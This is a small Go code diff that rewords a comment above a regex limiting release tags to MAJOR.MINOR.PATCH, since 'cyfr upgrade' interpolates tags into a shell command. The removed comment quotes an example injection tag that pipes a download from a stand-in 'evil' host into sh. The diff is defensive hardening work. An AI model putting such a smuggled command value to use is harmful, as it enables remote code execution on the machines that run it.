@@ -19,11 +19,8 @@ import (
 // on a stalled connection. `http.DefaultClient` has no timeout at all.
 var httpClient = &http.Client{Timeout: 10 * time.Second}
 
-// bareSemver is the only shape a release tag may take: MAJOR.MINOR.PATCH
-// with no prefix, which also skips the legacy `v*` and `porta-v*` tags.
-// `cyfr upgrade` interpolates this string into a shell command line, so
-// "starts with a digit" was not a strong enough filter — a tag like
-// `0;curl evil|sh;#` passed it.
+// bareSemver accepts only MAJOR.MINOR.PATCH without a prefix.
+// Release tags must be safe to interpolate into the upgrade shell command.
 var bareSemver = regexp.MustCompile(`^\d+\.\d+\.\d+$`)
 
 // apiURL is the GitHub releases endpoint for the CYFR repo. It is a package
